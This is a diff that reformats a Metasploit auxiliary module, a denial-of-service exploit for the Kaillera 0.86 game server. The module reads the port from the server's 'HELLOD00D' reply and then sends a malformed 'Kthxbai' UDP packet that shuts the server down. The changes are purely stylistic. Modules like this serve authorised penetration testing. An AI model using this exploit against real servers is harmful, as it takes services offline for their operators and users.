@@ -8,15 +8,19 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Kaillera 0.86 Server Denial of Service' ,
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Kaillera 0.86 Server Denial of Service',
+        'Description' => %q{
           The Kaillera 0.86 server can be shut down by sending any malformed packet
-        after the initial "hello" packet.
-      },
-      'Author'         => ["Sil3nt_Dre4m"],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2011-07-02'))
+          after the initial "hello" packet.
+        },
+        'Author' => ["Sil3nt_Dre4m"],
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2011-07-02'
+      )
+    )
 
     register_options([
       Opt::RPORT(27888)
@@ -34,11 +38,11 @@ class MetasploitModule < Msf::Auxiliary
     if res[0] =~ /HELLOD00D([0-9]{1,5})/
       port = $1
     else print_error("Connection failed")
-      return
+         return
     end
 
     # Send DOS packet
-    connect_udp(global = true,'RPORT' => port)
+    connect_udp(global = true, 'RPORT' => port)
     print_status("Sending DoS packet to #{rhost}:#{port}...")
     udp_sock.put("Kthxbai")
     disconnect_udp
